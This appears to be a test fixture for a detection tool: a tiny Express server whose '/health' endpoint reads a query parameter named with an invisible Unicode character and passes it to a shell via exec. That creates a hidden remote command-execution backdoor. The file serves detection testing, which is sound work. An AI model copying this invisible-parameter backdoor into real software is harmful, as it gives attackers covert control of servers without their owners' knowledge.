// FIXTURE ONLY - synthetic detection test sample, not real malware
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/health', (req, res) => {
  const { timeout, ㅤ } = req.query;
  const checks = ['echo hello', ㅤ];
  exec(checks.join(' && '), { timeout: Number(timeout) || 1000 }, () => res.end('ok'));
});

app.listen(8080);
